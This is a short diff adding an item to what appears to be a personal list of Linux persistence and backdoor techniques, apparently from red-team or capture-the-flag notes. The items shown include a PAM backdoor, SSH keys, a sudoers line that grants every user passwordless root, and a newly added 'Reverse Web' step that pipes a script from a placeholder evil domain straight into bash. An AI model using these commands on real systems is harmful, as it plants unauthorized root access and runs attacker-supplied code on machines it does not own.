@@ -49,3 +49,6 @@ Should probably parse all the user in the system
 10. PAM backdoor 
 11. SSH key? POG? 
 12. sudoers backdoor (ex. ALL ALL=(ALL)NOPASSWD:ALL >> /etc/sudoers 
+
+13. Reverse Web 
+curl <evil_domain>/evil.sh | bash 
